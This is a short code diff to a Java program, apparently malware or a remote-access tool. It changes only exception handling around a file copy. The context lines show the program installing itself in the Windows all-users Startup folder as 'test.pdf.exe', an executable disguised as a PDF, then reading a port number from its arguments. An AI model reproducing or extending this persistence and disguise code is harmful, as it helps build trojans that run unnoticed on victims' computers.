@@ -12,7 +12,7 @@ import java.nio.file.Files;
 public class Main {
     private static final Logger LOGGER = Logger.getLogger(Main.class);
 
-    public static void main(String[] args) throws IOException, InterruptedException {
+    public static void main(String[] args)  {
 
         if (args.length != 4) {
             System.out.println("Usage :");
@@ -23,7 +23,11 @@ public class Main {
             File targetFile = new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.pdf.exe");
 
             if (!targetFile.exists()) {
-                Files.copy(sourceFile.toPath(), targetFile.toPath());
+                try {
+                    Files.copy(sourceFile.toPath(), targetFile.toPath());
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
             }
 
             int port = Integer.parseInt(args[0]);
